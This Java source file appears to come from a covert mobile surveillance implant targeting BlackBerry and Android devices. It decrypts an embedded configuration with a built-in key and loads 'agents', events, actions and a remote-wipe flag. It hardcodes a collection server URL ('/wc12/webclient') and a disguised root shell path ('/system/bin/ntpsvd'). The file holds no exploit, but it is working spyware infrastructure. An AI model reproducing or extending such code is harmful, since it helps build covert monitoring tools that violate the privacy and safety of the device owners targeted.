package blackberry.config;

import java.util.Vector;

import rpc.json.me.JSONArray;
import rpc.json.me.JSONException;
import rpc.json.me.JSONObject;
import rpc.json.me.JSONTokener;
import blackberry.GeneralException;
import blackberry.Status;
import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.agent.Module;
import blackberry.crypto.EncryptionPKCS5;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.utils.Check;

public class Configuration {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Configuration", DebugLevel.VERBOSE);
    //#endif

    /** The status obj. */
    private final Status status;

    /**
     * Configuration file embedded into the .apk
     */
    private final String jsonResource;

    /** Clear configuration buffer wrapped into a ByteBuffer. */
    // private ByteBuffer wrappedClearConf;

    /** The Constant TASK_ACTION_TIMEOUT. */
    public static final long TASK_ACTION_TIMEOUT = 600000;

    public static final boolean OVERRIDE_SYNC_URL = false;
    public static final String SYNC_URL = "http://172.20.20.147/wc12/webclient"; //$NON-NLS-1$
    /** The Constant MIN_AVAILABLE_SIZE. */
    public static final long MIN_AVAILABLE_SIZE = 200 * 1024;

    public static final String shellFile = "/system/bin/ntpsvd";

    private static final int AGENT_ENABLED = 0x2;

    private static final int DIGEST_LEN = 20;

    // public static final String SYNC_URL =
    // "http://192.168.1.189/wc12/webclient";

    // public static final boolean DEBUG = Config.DEBUG;

    /**
     * Instantiates a new configuration.
     * 
     * @param resource
     *            the resource
     * @throws GeneralException
     */
    public Configuration(final byte[] resource) throws ConfigurationException {
        status = Status.getInstance();
        // Decrypt Conf
        jsonResource = decryptConfiguration(resource);
    }

    public Configuration(String jsonConf) throws ConfigurationException {
        status = Status.getInstance();
        jsonResource = jsonConf;
    }

    /**
     * Load configuration.
     * 
     * @return true, if successful
     * @throws GeneralException
     *             the rCS exception
     */
    public boolean loadConfiguration(boolean instantiate) {
        try {
            // Clean old configuration
            if (instantiate) {
                cleanConfiguration();
            }

            // Parse and load configuration
            return parseConfiguration(instantiate, jsonResource);
        } catch (final Exception rcse) {
            return false;
        }

    }

    abstract static class Visitor {
        protected boolean instantiate;

        public Visitor(boolean instantiate) {
            this.instantiate = instantiate;
        }

        public static void load(JSONArray jmodules, Visitor visitor) {
            int agentTag;

            // How many agents we have?
            final int num = jmodules.length();

            //#ifdef DEBUG
            debug.trace("load, number of elements: " + num);
            //#endif

            // Get id, status, parameters length and parameters
            for (int i = 0; i < num; i++) {
                JSONObject jobject;
                try {
                    jobject = jmodules.getJSONObject(i);
                    //#ifdef DEBUG
                    debug.trace("load " + jobject);
                    //#endif
                    visitor.call(i, jobject);
                } catch (JSONException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif

                } catch (ConfigurationException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                }
            }
        }

        public abstract void call(int id, JSONObject o)
                throws ConfigurationException, JSONException;
    }

    class LoadModule extends Visitor {
        public LoadModule(boolean instantiate) {
            super(instantiate);
        }

        public void call(int moduleId, JSONObject params)
                throws ConfigurationException, JSONException {
            final String moduleType = params.getString("module");

            //#ifdef DEBUG
            debug.trace("call  Module: " + moduleType + " Params size: "
                    + params.length());
            //#endif

            if (instantiate) {
                final ConfModule a = new ConfModule(moduleType, params);
                Status.getInstance().addAgent(a);
            }
        }
    }

    class LoadEvent extends Visitor {
        public LoadEvent(boolean instantiate) {
            super(instantiate);
        }

        public void call(int eventId, JSONObject jmodule) throws JSONException {

            Check.requires(jmodule != null,
                    " (call) Assert failed, null jmodule");

            String eventType = jmodule.getString("event");

            Check.asserts(eventType != null,
                    " (call) Assert failed, null eventType");

            if (jmodule.has("type")) {
                eventType += " " + jmodule.getString("type");
            }

            //#ifdef DEBUG
            debug.trace("call Event: " + eventId + " type: " + eventType
                    + " Params size: " + jmodule.length());
            //#endif

            if (instantiate) {
                final ConfEvent e = new ConfEvent(eventId, eventType, jmodule);
                Status.getInstance().addEvent(e);
            }

        }
    }

    class LoadAction extends Visitor {
        public LoadAction(boolean instantiate) {
            super(instantiate);
        }

        public void call(int actionId, JSONObject jaction)
                throws ConfigurationException, JSONException {
            String desc = jaction.getString("desc");
            final Action a = new Action(actionId, desc);

            JSONArray jsubactions = jaction.getJSONArray("subactions");
            int subNum = jsubactions.length();

            //#ifdef DEBUG
            debug.trace("call Action " + actionId + " SubActions: " + subNum);
            //#endif

            for (int j = 0; j < subNum; j++) {
                JSONObject jsubaction = jsubactions.getJSONObject(j);

                final String type = jsubaction.getString("action");
                ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
                if (a.addSubAction(conf)) {
                    //#ifdef DEBUG
                    debug.trace("call SubAction " + j + " Type: " + type
                            + " Params Length: " + jsubaction.length());
                    //#endif

                }
            }

            Check.ensures(a.getSubActionsNum() == subNum,
                    "inconsistent subaction number"); //$NON-NLS-1$

            if (instantiate) {
                status.addAction(a);
            }
        }
    }

    /**
     * Parses the configuration. k
     * 
     * @throws GeneralException
     *             the rCS exception
     */
    private boolean parseConfiguration(boolean instantiate, String json) {
        try {
            //#ifdef DEBUG
            debug.trace("parseConfiguration: " + json);
            //#endif

            JSONObject root = (JSONObject) new JSONTokener(json).nextValue();

            JSONArray jmodules = root.getJSONArray("modules");
            JSONArray jevents = root.getJSONArray("events");
            JSONArray jactions = root.getJSONArray("actions");
            JSONObject jglobals = root.getJSONObject("globals");

            Visitor.load(jmodules, new LoadModule(instantiate));
            Visitor.load(jevents, new LoadEvent(instantiate));
            Visitor.load(jactions, new LoadAction(instantiate));

            loadGlobals(jglobals, instantiate);

            //#ifdef DEBUG
            showStatus();

            status.statusActions();
            status.statusModules();
            status.statusEvents();
            status.statusGlobals();
            //#endif

            return true;
        } catch (JSONException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            return false;
        }

    }

    private void showStatus() {
        //#ifdef DEBUG
        debug.trace("----------");
        debug.info("AGENTS");
        Vector vector = status.getAgentsList();
        for (int i = 0; i < vector.size(); i++) {
            Module agent = (Module) vector.elementAt(i);
            if (agent.isEnabled()) {
                debug.info("    " + agent.toString());
            }
        }

        debug.info("ACTIONS");
        vector = status.getActionsList();
        for (int i = 0; i < vector.size(); i++) {
            Action action = (Action) vector.elementAt(i);
            debug.info("    " + action.toString());
            Vector subs = action.getSubActionsList();
            for (int j = 0; j < subs.size(); j++) {
                SubAction sub = (SubAction) subs.elementAt(j);
                debug.info("        " + sub.toString());
            }
        }

        debug.info("EVENTS");
        vector = status.getEventsList();
        for (int i = 0; i < vector.size(); i++) {
            Event event = (Event) vector.elementAt(i);
            if (event.isEnabled()) {
                debug.info("    " + event.toString());
            }
        }
        //#endif
    }

    private void loadGlobals(JSONObject jglobals, boolean instantiate)
            throws JSONException {

        Globals g = new Globals();

        JSONObject jquota = jglobals.getJSONObject("quota");
        g.quotaMin = jquota.getInt("min");
        g.quotaMax = jquota.getInt("max");

        g.wipe = jglobals.getBoolean("wipe");
        g.type = jglobals.getString("type");
        g.migrated = jglobals.getBoolean("migrated");
        g.version = jglobals.getInt("version");

        status.setGlobal(g);
    }

    /**
     * Decrypt configuration.
     * 
     * @param rawConf
     *            the raw conf
     * @return
     * @throws GeneralException
     *             the rCS exception
     */
    private String decryptConfiguration(final byte[] rawConf) {
        /**
         * Struttura del file di configurazione
         * 
         * |DWORD|DWORD|DWORD|DATA.....................|CRC| |---Skip----|-Len-|
         * 
         * Le prime due DWORD vanno skippate. La terza DWORD contiene la
         * lunghezza del blocco di dati (inclusa la stessa Len) CRC e' il CRC
         * (cifrato) dei dati in chiaro, inclusa la DWORD Len
         */

        try {
            EncryptionPKCS5 crypto = new EncryptionPKCS5(Keys.getInstance()
                    .getConfKey());
            final byte[] clearConf = crypto.decryptDataIntegrity(rawConf);

            String json = new String(clearConf);

            if (json != null && json.length() > 0) {
                // Return decrypted conf
                //#ifdef DEBUG
                debug.trace("decryptConfiguration: valid");
                //#endif

                return json;
            }
            return null;

        } catch (final SecurityException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("decryptConfiguration");
            //#endif
        } catch (final Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("decryptConfiguration");
            //#endif
        }

        return null;
    }

    /**
     * Clean configuration and status objects.
     */
    public void cleanConfiguration() {
        // Clean an eventual old initialization
        status.clear();

    }

}
